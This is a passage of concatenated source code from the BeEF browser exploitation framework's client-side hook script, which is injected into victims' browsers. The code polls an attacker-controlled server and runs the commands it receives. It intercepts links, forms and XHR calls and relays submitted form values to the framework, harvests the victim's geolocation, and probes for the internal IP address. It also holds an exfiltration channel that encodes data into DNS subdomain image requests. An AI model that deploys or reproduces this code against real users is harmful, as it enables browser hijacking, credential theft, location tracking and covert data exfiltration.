            } else {
                if (document.location.port == port)
                    cross_domain = false;
            }
        }

        // build the url
        var url = "";
        if (path.indexOf("http://") != -1 || path.indexOf("https://") != -1) {
            url = path;
        } else {
            url = scheme + "://" + domain;
            url = (port != null) ? url + ":" + port : url;
            url = (path != null) ? url + path : url;
            url = (anchor != null) ? url + "#" + anchor : url;
        }

        // define response object
        var response = new this.response;
        response.was_cross_domain = cross_domain;
        var start_time = new Date().getTime();

        // if cross-domain requests are not allowed and the request is cross-domain
        // don't proceed and return
        if (allowCrossDomain == "false" && cross_domain) {
            beef.debug("[beef.net.forge_request] Error: Cross Domain Request. The request was not sent.");
            response.status_code = -1;
            response.status_text = "crossdomain";
            response.port_status = "crossdomain";
            response.response_body = "ERROR: Cross Domain Request. The request was not sent.\n";
            response.headers = "ERROR: Cross Domain Request. The request was not sent.\n";
            if (callback != null)
                callback(response, requestid);
            return response;
        }

        // if the request was cross-domain from a HTTPS origin to HTTP
        // don't proceed and return
        if (document.location.protocol == 'https:' && scheme == 'http') {
            beef.debug("[beef.net.forge_request] Error: Mixed Active Content. The request was not sent.");
            response.status_code = -1;
            response.status_text = "mixedcontent";
            response.port_status = "mixedcontent";
            response.response_body = "ERROR: Mixed Active Content. The request was not sent.\n";
            response.headers = "ERROR: Mixed Active Content. The request was not sent.\n";
            if (callback != null)
                callback(response, requestid);
            return response;
        }

        /*
         * according to http://api.jquery.com/jQuery.ajax/, Note: having 'script':
         * This will turn POSTs into GETs for remote-domain requests.
         */
        if (method == "POST") {
            $j.ajaxSetup({
                dataType: dataType
            });
        } else {
            $j.ajaxSetup({
                dataType: 'script'
            });
        }

        // this is required for bugs in IE so data can be transferred back to the server
        if (beef.browser.isIE()) {
            dataType = 'script'
        }

        $j.ajax({
            type: method,
            dataType: dataType,
            url: url,
            headers: headers,
            timeout: (timeout * 1000),

            //This is needed, otherwise jQuery always add Content-type: application/xml, even if data is populated.
            beforeSend: function(xhr) {
                if (method == "POST") {
                    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=utf-8");
                }
            },

            data: data,

            // http server responded successfully
            success: function(data, textStatus, xhr) {
                var end_time = new Date().getTime();
                response.status_code = xhr.status;
                response.status_text = textStatus;
                response.response_body = data;
                response.was_timedout = false;
                response.duration = (end_time - start_time);
            },

            // server responded with a http error (403, 404, 500, etc)
            // or server is not a http server
            error: function(xhr, textStatus, errorThrown) {
                var end_time = new Date().getTime();
                response.response_body = xhr.responseText;
                response.status_code = xhr.status;
                response.status_text = textStatus;
                response.duration = (end_time - start_time);
            },

            complete: function(xhr, textStatus) {
                // cross-domain request
                if (cross_domain) {

                    response.port_status = "crossdomain";

                    if (xhr.status != 0) {
                        response.status_code = xhr.status;
                    } else {
                        response.status_code = -1;
                    }

                    if (textStatus) {
                        response.status_text = textStatus;
                    } else {
                        response.status_text = "crossdomain";
                    }

                    if (xhr.getAllResponseHeaders()) {
                        response.headers = xhr.getAllResponseHeaders();
                    } else {
                        response.headers = "ERROR: Cross Domain Request. The request was sent however it is impossible to view the response.\n";
                    }

                    if (!response.response_body) {
                        response.response_body = "ERROR: Cross Domain Request. The request was sent however it is impossible to view the response.\n";
                    }

                } else {
                    // same-domain request
                    response.status_code = xhr.status;
                    response.status_text = textStatus;
                    response.headers = xhr.getAllResponseHeaders();

                    // determine if TCP port is open/closed/not-http
                    if (textStatus == "timeout") {
                        response.was_timedout = true;
                        response.response_body = "ERROR: Timed out\n";
                        response.port_status = "closed";
                        /*
                         * With IE we need to explicitly set the dataType to "script",
                         * so there will be always parse-errors if the content is != javascript
                         * */
                    } else if (textStatus == "parsererror") {
                        response.port_status = "not-http";
                        if (beef.browser.isIE()) {
                            response.status_text = "success";
                            response.port_status = "open";
                        }
                    } else {
                        response.port_status = "open";
                    }
                }
                callback(response, requestid);
            }
        });
        return response;
    },

    //this is a stub, as associative arrays are not parsed by JSON, all key / value pairs should use new Object() or {}
    //http://andrewdupont.net/2006/05/18/javascript-associative-arrays-considered-harmful/
    clean: function(r) {
        if (this.array_has_string_key(r)) {
            var obj = {};
            for (var key in r)
                obj[key] = (this.array_has_string_key(obj[key])) ? this.clean(r[key]) : r[key];
            return obj;
        }
        return r;
    },

    //Detects if an array has a string key
    array_has_string_key: function(arr) {
        if ($j.isArray(arr)) {
            try {
                for (var key in arr)
                    if (isNaN(parseInt(key)))
                        return true;
            } catch (e) {}
        }
        return false;
    },

    /**
     * Checks if the specified port is valid
     */
    is_valid_port: function(port) {
        if (isNaN(port))
            return false;
        if (port > 65535 || port < 0)
            return false;
        return true;
    },

    /**
     * Checks if the specified IP address is valid
     */
    is_valid_ip: function(ip) {
        if (ip == null)
            return false;
        var ip_match = ip.match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
        if (ip_match == null)
            return false;
        return true;
    },

    /**
     * Checks if the specified IP address range is valid
     */
    is_valid_ip_range: function(ip_range) {
        if (ip_range == null)
            return false;
        var range_match = ip_range.match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\-([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
        if (range_match == null || range_match[1] == null)
            return false;
        return true;
    },

    /**
     * Sends back browser details to framework, calling beef.browser.getDetails()
     */
    browser_details: function() {
        var details = beef.browser.getDetails();
        var res = null;
        details['HookSessionID'] = beef.session.get_hook_session_id();
        this.send('/init', 0, details);
        if (details != null)
            res = true;

        return res;
    }

};

beef.regCmp('beef.net');

//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @Literal object: beef.updater
 *
 * Object in charge of getting new commands from the BeEF framework and execute them.
 * The XHR-polling channel is managed here. If WebSockets are enabled,
 * websocket.ls is used instead.
 */
beef.updater = {

    // XHR-polling timeout.
    xhr_poll_timeout: "1000",
    beefhook: "BEEFHOOK",

    // A lock.
    lock: false,

    // An object containing all values to be registered and sent by the updater.
    objects: new Object(),

    /*
	 * Registers an object to always send when requesting new commands to the framework.
	 * @param: {String} the name of the object.
	 * @param: {String} the value of that object.
	 * 
	 * @example: beef.updater.regObject('java_enabled', 'true');
	 */
    regObject: function(key, value) {
        this.objects[key] = escape(value);
    },

    // Checks for new commands from the framework and runs them.
    check: function() {
        if (this.lock == false) {
            if (beef.logger.running) {
                beef.logger.queue();
            }
            beef.net.flush();
            if (beef.commands.length > 0) {
                this.execute_commands();
            } else {
                this.get_commands();
                /*Polling*/
            }
        }
        /* The following gives a stupid syntax error in IE, which can be ignored*/
        setTimeout(function() {
            beef.updater.check()
        }, beef.updater.xhr_poll_timeout);
    },

    /**
     * Gets new commands from the framework.
     */
    get_commands: function() {
        try {
            this.lock = true;
            beef.net.request(beef.net.httpproto, 'GET', beef.net.host, beef.net.port, beef.net.hook, null, beef.updater.beefhook + '=' + beef.session.get_hook_session_id(), 5, 'script', function(response) {
                if (response.body != null && response.body.length > 0)
                    beef.updater.execute_commands();
            });
        } catch (e) {
            this.lock = false;
            return;
        }
        this.lock = false;
    },

    /**
     * Executes the received commands, if any.
     */
    execute_commands: function() {
        if (beef.commands.length == 0)
            return;
        this.lock = true;
        while (beef.commands.length > 0) {
            command = beef.commands.pop();
            try {
                command();
            } catch (e) {
                beef.debug('execute_commands - command failed to execute: ' + e.message);
                // prints the command source to be executed, to better trace errors
                // beef.client_debug must be enabled in the main config
                beef.debug(command.toString());
            }
        }
        this.lock = false;
    }
};

beef.regCmp('beef.updater');

//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// Base64 code from http://stackoverflow.com/questions/3774622/how-to-base64-encode-inside-of-javascript/3774662#3774662

beef.encode = {};

beef.encode.base64 = {

    keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",

    encode: function(input) {
        if (window.btoa) {
            return btoa(unescape(encodeURIComponent(input)));
        }

        var output = "";
        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
        var i = 0;

        input = beef.encode.base64.utf8_encode(input);

        while (i < input.length) {

            chr1 = input.charCodeAt(i++);
            chr2 = input.charCodeAt(i++);
            chr3 = input.charCodeAt(i++);

            enc1 = chr1 >> 2;
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
            enc4 = chr3 & 63;

            if (isNaN(chr2)) {
                enc3 = enc4 = 64;
            } else if (isNaN(chr3)) {
                enc4 = 64;
            }

            output = output + this.keyStr.charAt(enc1) + this.keyStr.charAt(enc2) + this.keyStr.charAt(enc3) + this.keyStr.charAt(enc4);

        }

        return output;
    },

    decode: function(input) {
        if (window.atob) {
            return escape(atob(input));
        }

        var output = "";
        var chr1, chr2, chr3;
        var enc1, enc2, enc3, enc4;
        var i = 0;

        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

        while (i < input.length) {

            enc1 = this.keyStr.indexOf(input.charAt(i++));
            enc2 = this.keyStr.indexOf(input.charAt(i++));
            enc3 = this.keyStr.indexOf(input.charAt(i++));
            enc4 = this.keyStr.indexOf(input.charAt(i++));

            chr1 = (enc1 << 2) | (enc2 >> 4);
            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
            chr3 = ((enc3 & 3) << 6) | enc4;

            output = output + String.fromCharCode(chr1);

            if (enc3 != 64) {
                output = output + String.fromCharCode(chr2);
            }
            if (enc4 != 64) {
                output = output + String.fromCharCode(chr3);
            }

        }

        output = beef.encode.base64.utf8_decode(output);

        return output;

    },

    utf8_encode: function(string) {
        string = string.replace(/\r\n/g, "\n");
        var utftext = "";

        for (var n = 0; n < string.length; n++) {

            var c = string.charCodeAt(n);

            if (c < 128) {
                utftext += String.fromCharCode(c);
            } else if ((c > 127) && (c < 2048)) {
                utftext += String.fromCharCode((c >> 6) | 192);
                utftext += String.fromCharCode((c & 63) | 128);
            } else {
                utftext += String.fromCharCode((c >> 12) | 224);
                utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                utftext += String.fromCharCode((c & 63) | 128);
            }

        }

        return utftext;
    },

    utf8_decode: function(utftext) {
        var string = "";
        var i = 0;
        var c = c1 = c2 = 0;

        while (i < utftext.length) {

            c = utftext.charCodeAt(i);

            if (c < 128) {
                string += String.fromCharCode(c);
                i++;
            } else if ((c > 191) && (c < 224)) {
                c2 = utftext.charCodeAt(i + 1);
                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                i += 2;
            } else {
                c2 = utftext.charCodeAt(i + 1);
                c3 = utftext.charCodeAt(i + 2);
                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                i += 3;
            }

        }

        return string;
    }

};

beef.regCmp('beef.encode.base64');

//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// Json code from Brantlye Harris-- http://code.google.com/p/jquery-json/

beef.encode.json = {

    stringify: function(o) {
        if (typeof (JSON) == 'object' && JSON.stringify) {
            // Error on stringifying cylcic structures caused polling to die
            try {
                s = JSON.stringify(o);
            } catch (error) {// TODO log error / handle cyclic structures? 
            }
            return s;
        }
        var type = typeof (o);

        if (o === null)
            return "null";

        if (type == "undefined")
            return '\"\"';

        if (type == "number" || type == "boolean")
            return o + "";

        if (type == "string")
            return $j.quoteString(o);

        if (type == 'object') {
            if (typeof o.toJSON == "function")
                return $j.toJSON(o.toJSON());

            if (o.constructor === Date) {
                var month = o.getUTCMonth() + 1;
                if (month < 10)
                    month = '0' + month;

                var day = o.getUTCDate();
                if (day < 10)
                    day = '0' + day;

                var year = o.getUTCFullYear();

                var hours = o.getUTCHours();
                if (hours < 10)
                    hours = '0' + hours;

                var minutes = o.getUTCMinutes();
                if (minutes < 10)
                    minutes = '0' + minutes;

                var seconds = o.getUTCSeconds();
                if (seconds < 10)
                    seconds = '0' + seconds;

                var milli = o.getUTCMilliseconds();
                if (milli < 100)
                    milli = '0' + milli;
                if (milli < 10)
                    milli = '0' + milli;

                return '"' + year + '-' + month + '-' + day + 'T' + hours + ':' + minutes + ':' + seconds + '.' + milli + 'Z"';
            }

            if (o.constructor === Array) {
                var ret = [];
                for (var i = 0; i < o.length; i++)
                    ret.push($j.toJSON(o[i]) || "null");

                return "[" + ret.join(",") + "]";
            }

            var pairs = [];
            for (var k in o) {
                var name;
                var type = typeof k;

                if (type == "number")
                    name = '"' + k + '"';
                else if (type == "string")
                    name = $j.quoteString(k);
                else
                    continue;
                //skip non-string or number keys

                if (typeof o[k] == "function")
                    continue;
                //skip pairs where the value is a function.

                var val = $j.toJSON(o[k]);

                pairs.push(name + ":" + val);
            }

            return "{" + pairs.join(", ") + "}";
        }
    },

    quoteString: function(string) {
        if (string.match(this._escapeable)) {
            return '"' + string.replace(this._escapeable, function(a) {
                var c = this._meta[a];
                if (typeof c === 'string')
                    return c;
                c = a.charCodeAt();
                return '\\u00' + Math.floor(c / 16).toString(16) + (c % 16).toString(16);
            }) + '"';
        }
        return '"' + string + '"';
    },

    _escapeable: /["\\\x00-\x1f\x7f-\x9f]/g,

    _meta: {
        '\b': '\\b',
        '\t': '\\t',
        '\n': '\\n',
        '\f': '\\f',
        '\r': '\\r',
        '"': '\\"',
        '\\': '\\\\'
    }
};

$j.toJSON = function(o) {
    return beef.encode.json.stringify(o);
}
;
$j.quoteString = function(o) {
    return beef.encode.json.quoteString(o);
}
;

beef.regCmp('beef.encode.json');

//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.net.local
 * 
 * Provides networking functions for the local/internal network of the zombie.
 */
beef.net.local = {

    sock: false,
    checkJava: false,
    hasJava: false,

    /**
	 * Initializes the java socket. We have to use this method because
	 * some browsers do not have java installed or it is not accessible.
	 * in which case creating a socket directly generates an error. So this code
	 * is invalid:
	 * sock: new java.net.Socket();
	 */

    initializeSocket: function() {
        if (this.checkJava) {
            if (!beef.browser.hasJava()) {
                this.checkJava = True;
                this.hasJava = False;
                return -1;
            } else {
                this.checkJava = True;
                this.hasJava = True;
                return 1;
            }
        } else {
            if (!this.hasJava)
                return -1;
            else {
                try {
                    this.sock = new java.net.Socket();
                } catch (e) {
                    return -1;
                }
                return 1;
            }
        }
    },

    /**
	 * Returns the internal IP address of the zombie.
	 * @return: {String} the internal ip of the zombie.
	 * @error: return -1 if the internal ip cannot be retrieved.
	 */
    getLocalAddress: function() {
        if (!this.hasJava)
            return false;

        this.initializeSocket();

        try {
            this.sock.bind(new java.net.InetSocketAddress('0.0.0.0',0));
            this.sock.connect(new java.net.InetSocketAddress(document.domain,(!document.location.port) ? 80 : document.location.port));

            return this.sock.getLocalAddress().getHostAddress();
        } catch (e) {
            return false;
        }
    },

    /**
	 * Returns the internal hostname of the zombie.
	 * @return: {String} the internal hostname of the zombie.
	 * @error: return -1 if the hostname cannot be retrieved.
	 */
    getLocalHostname: function() {
        if (!this.hasJava)
            return false;

        this.initializeSocket();

        try {
            this.sock.bind(new java.net.InetSocketAddress('0.0.0.0',0));
            this.sock.connect(new java.net.InetSocketAddress(document.domain,(!document.location.port) ? 80 : document.location.port));

            return this.sock.getLocalAddress().getHostName();
        } catch (e) {
            return false;
        }
    }

};

beef.regCmp('beef.net.local');

//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/**
 * @literal object: beef.init
 * Contains the beef_init() method which starts the BeEF client-side
 * logic. Also, it overrides the 'onpopstate' and 'onclose' events on the windows object.
 *
 * If beef.pageIsLoaded is true, then this JS has been loaded >1 times
 * and will have a new session id. The new session id will need to know
 * the brwoser details. So sendback the browser details again.
 */

beef.session.get_hook_session_id();

if (beef.pageIsLoaded) {
    beef.net.browser_details();
}

window.onload = function() {
    beef_init();
}
;

window.onpopstate = function(event) {
    if (beef.onpopstate.length > 0) {
        event.preventDefault;
        for (var i = 0; i < beef.onpopstate.length; i++) {
            var callback = beef.onpopstate[i];
            try {
                callback(event);
            } catch (e) {
                beef.debug("window.onpopstate - couldn't execute callback: " + e.message);
            }
            return false;
        }
    }
}
;

window.onclose = function(event) {
    if (beef.onclose.length > 0) {
        event.preventDefault;
        for (var i = 0; i < beef.onclose.length; i++) {
            var callback = beef.onclose[i];
            try {
                callback(event);
            } catch (e) {
                beef.debug("window.onclose - couldn't execute callback: " + e.message);
            }
            return false;
        }
    }
}
;

/**
 * Starts the polling mechanism, and initialize various components:
 *  - browser details (see browser.js) are sent back to the "/init" handler
 *  - the polling starts (checks for new commands, and execute them)
 *  - the logger component is initialized (see logger.js)
 *  - the Autorun Engine is initialized (see are.js)
 */
function beef_init() {
    if (!beef.pageIsLoaded) {
        beef.pageIsLoaded = true;
        beef.net.browser_details();

        if (beef.browser.hasWebSocket() && typeof beef.websocket != 'undefined') {
            setTimeout(function() {
                beef.websocket.start();
                beef.updater.execute_commands();
                beef.logger.start();
            }, parseInt(beef.websocket.ws_connect_timeout));
        } else {
            beef.net.browser_details();
            beef.updater.execute_commands();
            beef.updater.check();
            beef.logger.start();
        }
    }
}

//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.mitb = {

    cid: null,
    curl: null,

    init: function(cid, curl) {
        beef.mitb.cid = cid;
        beef.mitb.curl = curl;
        /*Override open method to intercept ajax request*/
        var hook_file = "/hook.js";

        if (window.XMLHttpRequest && !(window.ActiveXObject)) {

            beef.mitb.sniff("Method XMLHttpRequest.open override");
            (function(open) {
                XMLHttpRequest.prototype.open = function(method, url, async, mitb_call) {
                    // Ignore it and don't hijack it. It's either a request to BeEF (hook file or Dynamic Handler)
                    // or a request initiated by the MiTB itself.
                    if (mitb_call || (url.indexOf(hook_file) != -1 || url.indexOf("/dh?") != -1)) {
                        open.call(this, method, url, async, true);
                    } else {
                        var portRegex = new RegExp(":[0-9]+");
                        var portR = portRegex.exec(url);
                        var requestPort;
                        if (portR != null) {
                            requestPort = portR[0].split(":")[1];
                        }

                        //GET request
                        if (method == "GET") {
                            //GET request -> cross-origin
                            if (url.indexOf(document.location.hostname) == -1 || (portR != null && requestPort != document.location.port)) {
                                beef.mitb.sniff("GET [Ajax CrossDomain Request]: " + url);
                                window.open(url);
                            } else {
                                //GET request -> same-origin
                                beef.mitb.sniff("GET [Ajax Request]: " + url);
                                if (beef.mitb.fetch(url, document.getElementsByTagName("html")[0])) {
                                    var title = "";
                                    if (document.getElementsByTagName("title").length == 0) {
                                        title = document.title;
                                    } else {
                                        title = document.getElementsByTagName("title")[0].innerHTML;
                                    }
                                    // write the url of the page
                                    history.pushState({
                                        Be: "EF"
                                    }, title, url);
                                }
                            }
                        } else {
                            //POST request
                            beef.mitb.sniff("POST ajax request to: " + url);
                            open.call(this, method, url, async, true);
                        }
                    }
                }
                ;
            }
            )(XMLHttpRequest.prototype.open);
        }
    },

    // Initializes the hook on anchors and forms.
    hook: function() {
        beef.onpopstate.push(function(event) {
            beef.mitb.fetch(document.location, document.getElementsByTagName("html")[0]);
        });
        beef.onclose.push(function(event) {
            beef.mitb.endSession();
        });

        var anchors = document.getElementsByTagName("a");
        var forms = document.getElementsByTagName("form");
        var lis = document.getElementsByTagName("li");

        for (var i = 0; i < anchors.length; i++) {
            anchors[i].onclick = beef.mitb.poisonAnchor;
        }
        for (var i = 0; i < forms.length; i++) {
            beef.mitb.poisonForm(forms[i]);
        }

        for (var i = 0; i < lis.length; i++) {
            if (lis[i].hasAttribute("onclick")) {
                lis[i].removeAttribute("onclick");
                /*clear*/
                lis[i].setAttribute("onclick", "beef.mitb.fetchOnclick('" + lis[i].getElementsByTagName("a")[0] + "')");
                /*override*/

            }
        }
    },

    // Hooks anchors and prevents them from linking away
    poisonAnchor: function(e) {
        try {
            e.preventDefault;
            if (beef.mitb.fetch(e.currentTarget, document.getElementsByTagName("html")[0])) {
                var title = "";
                if (document.getElementsByTagName("title").length == 0) {
                    title = document.title;
                } else {
                    title = document.getElementsByTagName("title")[0].innerHTML;
                }
                history.pushState({
                    Be: "EF"
                }, title, e.currentTarget);
            }
        } catch (e) {
            beef.debug('beef.mitb.poisonAnchor - failed to execute: ' + e.message);
        }
        return false;
    },

    // Hooks forms and prevents them from linking away
    poisonForm: function(form) {
        form.onsubmit = function(e) {

            // Collect <input> tags.
            var inputs = form.getElementsByTagName("input");
            var query = "";
            for (var i = 0; i < inputs.length; i++) {
                switch (inputs[i].type) {
                case "submit":
                    break;
                default:
                    query += inputs[i].name + "=" + inputs[i].value + '&';
                    break;
                }
            }

            // Collect selected options from the form.
            var selects = form.getElementsByTagName("select");
            for (var i = 0; i < selects.length; i++) {
                var select = selects[i];
                query += select.name + "=" + select.options[select.selectedIndex].value + '&';
            }

            // We should be gathering 'submit' inputs as well, as there are 
            // applications demanding this parameter.
            var submit = $j('*[type="submit"]', form);
            if (submit.length) {
                // Append name of the submit button/input.
                query += submit.attr('name') + '=' + submit.attr('value');
            }

            if (query.slice(-1) == '&') {
                query = query.slice(0, -1);
            }

            e.preventdefault;
            beef.mitb.fetchForm(form.action, query, document.getElementsByTagName("html")[0]);
            history.pushState({
                Be: "EF"
            }, "", form.action);
            return false;
        }
    },

    // Fetches a hooked form with AJAX
    fetchForm: function(url, query, target) {
        try {
            var y = new XMLHttpRequest();
            y.open('POST', url, false, true);
            y.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            y.onreadystatechange = function() {
                if (y.readyState == 4 && y.responseText != "") {
                    target.innerHTML = y.responseText;
                    setTimeout(beef.mitb.hook, 10);
                }
            }
            ;
            y.send(query);
            beef.mitb.sniff("POST: " + url + "[" + query + "]");
            return true;
        } catch (x) {
            return false;
        }
    },

    // Fetches a hooked link with AJAX
    fetch: function(url, target) {
        try {
            var y = new XMLHttpRequest();
            y.open('GET', url, false, true);
            y.onreadystatechange = function() {
                if (y.readyState == 4 && y.responseText != "") {
                    target.innerHTML = y.responseText;
                    setTimeout(beef.mitb.hook, 10);
                }
            }
            ;
            y.send(null);
            beef.mitb.sniff("GET: " + url);
            return true;
        } catch (x) {
            window.open(url);
            beef.mitb.sniff("GET [New Window]: " + url);
            return false;
        }
    },

    // Fetches a window.location=http://domainname.com and setting up history
    fetchOnclick: function(url) {
        try {
            var target = document.getElementsByTagName("html")[0];
            var y = new XMLHttpRequest();
            y.open('GET', url, false, true);
            y.onreadystatechange = function() {
                if (y.readyState == 4 && y.responseText != "") {
                    var title = "";
                    if (document.getElementsByTagName("title").length == 0) {
                        title = document.title;
                    } else {
                        title = document.getElementsByTagName("title")[0].innerHTML;
                    }
                    history.pushState({
                        Be: "EF"
                    }, title, url);
                    target.innerHTML = y.responseText;
                    setTimeout(beef.mitb.hook, 10);
                }
            }
            ;
            y.send(null);
            beef.mitb.sniff("GET: " + url);

        } catch (x) {
            // the link is cross-origin, so load the resource in a different tab
            window.open(url);
            beef.mitb.sniff("GET [New Window]: " + url);
        }
    },

    // Relays an entry to the framework
    sniff: function(result) {
        try {
            beef.net.send(beef.mitb.cid, beef.mitb.curl, result);
        } catch (x) {}
        return true;
    },

    // Signals the Framework that the user has lost the hook
    endSession: function() {
        beef.mitb.sniff("Window closed.");
    }
};

beef.regCmp('beef.mitb');

//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.geolocation
 *
 * Provides functionalities to use the geolocation API.
 */
beef.geolocation = {

    /**
     * check if browser supports the geolocation API
     */
    isGeolocationEnabled: function() {
        return !!navigator.geolocation;
    },

    /*
     * given latitude/longitude retrieves exact street position of the zombie
     */
    getOpenStreetMapAddress: function(command_url, command_id, latitude, longitude) {

        // fixes damned issues with jquery 1.5, like this one:
        // http://bugs.jquery.com/ticket/8084
        $j.ajaxSetup({
            jsonp: null,
            jsonpCallback: null
        });

        $j.ajax({
            error: function(xhr, status, error) {
                beef.debug("[geolocation.js] openstreetmap error");
                beef.net.send(command_url, command_id, "latitude=" + latitude + "&longitude=" + longitude + "&osm=UNAVAILABLE" + "&geoLocEnabled=True");
            },
            success: function(data, status, xhr) {
                beef.debug("[geolocation.js] openstreetmap success");
                //var jsonResp = $j.parseJSON(data);

                beef.net.send(command_url, command_id, "latitude=" + latitude + "&longitude=" + longitude //                             + "&osm=" + encodeURI(jsonResp.display_name)
                + "&osm=" + data.display_name + "&geoLocEnabled=True");
            },
            type: "get",
            dataType: "json",
            url: "https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=" + latitude + "&lon=" + longitude + "&zoom=18&addressdetails=1"
        });

    },

    /*
     * retrieve latitude/longitude using the geolocation API
     */
    getGeolocation: function(command_url, command_id) {

        if (!navigator.geolocation) {
            beef.net.send(command_url, command_id, "latitude=NOT_ENABLED&longitude=NOT_ENABLED&geoLocEnabled=False");
            return;
        }
        beef.debug("[geolocation.js] navigator.geolocation.getCurrentPosition");
        navigator.geolocation.getCurrentPosition(//note: this is an async call
        function(position) {
            // success
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            beef.debug("[geolocation.js] success getting position. latitude [%d], longitude [%d]", latitude, longitude);
            beef.geolocation.getOpenStreetMapAddress(command_url, command_id, latitude, longitude);

        }, function(error) {
            // failure
            beef.debug("[geolocation.js] error [%d] getting position", error.code);
            switch (error.code) // Returns 0-3
            {
            case 0:
                beef.net.send(command_url, command_id, "latitude=UNKNOWN_ERROR&longitude=UNKNOWN_ERROR&geoLocEnabled=False");
                return;
            case 1:
                beef.net.send(command_url, command_id, "latitude=PERMISSION_DENIED&longitude=PERMISSION_DENIED&geoLocEnabled=False");
                return;
            case 2:
                beef.net.send(command_url, command_id, "latitude=POSITION_UNAVAILABLE&longitude=POSITION_UNAVAILABLE&geoLocEnabled=False");
                return;
            case 3:
                beef.net.send(command_url, command_id, "latitude=TIMEOUT&longitude=TIMEOUT&geoLocEnabled=False");
                return;
            }
            beef.net.send(command_url, command_id, "latitude=UNKNOWN_ERROR&longitude=UNKNOWN_ERROR&geoLocEnabled=False");
        }, {
            enableHighAccuracy: true,
            maximumAge: 30000,
            timeout: 27000
        });
    }
}

beef.regCmp('beef.geolocation');

//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.net.dns
 * 
 * request object structure:
 * + msgId: {Integer} Unique message ID for the request.
 * + domain: {String} Remote domain to retrieve the data.
 * + wait: {Integer} Wait time between requests (milliseconds) - NOT IMPLEMENTED
 * + callback: {Function} Callback function to receive the number of requests sent.
 */

beef.net.dns = {

    handler: "dns",

    send: function(msgId, data, domain, callback) {

        var encode_data = function(str) {
            var result = "";
            for (i = 0; i < str.length; ++i) {
                result += str.charCodeAt(i).toString(16).toUpperCase();
            }
            return result;
        };

        var encodedData = encodeURI(encode_data(data));

        beef.debug(encodedData);
        beef.debug("_encodedData_ length: " + encodedData.length);

        // limitations to DNS according to RFC 1035:
        // o Domain names must only consist of a-z, A-Z, 0-9, hyphen (-) and fullstop (.) characters
        // o Domain names are limited to 255 characters in length (including dots)
        // o The name space has a maximum depth of 127 levels (ie, maximum 127 subdomains)
        // o Subdomains are limited to 63 characters in length (including the trailing dot)

        // DNS request structure:
        // COMMAND_ID.SEQ_NUM.SEQ_TOT.DATA.DOMAIN
        //max_length: 3.   3   .   3   . 63 . x

        // only max_data_segment_length is currently used to split data into chunks. and only 1 chunk is used per request.
        // for optimal performance, use the following vars and use the whole available space (which needs changes server-side too)
        var reserved_seq_length = 3 + 3 + 3 + 3;
        // consider also 3 dots
        var max_domain_length = 255 - reserved_seq_length;
        //leave some space for sequence numbers
        var max_data_segment_length = 63;
        // by RFC

        beef.debug("max_data_segment_length: " + max_data_segment_length);

        var dom = document.createElement('b');

        String.prototype.chunk = function(n) {
            if (typeof n == 'undefined')
                n = 100;
            return this.match(RegExp('.{1,' + n + '}', 'g'));
        }
        ;

        var sendQuery = function(query) {
            var img = new Image;
            //img.src = "http://"+query;
            img.src = beef.net.httpproto + "://" + query;
            // prevents issues with mixed content
            img.onload = function() {
                dom.removeChild(this);
            }
            img.onerror = function() {
                dom.removeChild(this);
            }
            dom.appendChild(img);

            //experimental
            //setTimeout(function(){dom.removeChild(img)},1000);
        };

        var segments = encodedData.chunk(max_data_segment_length);

        var ident = "0xb3";
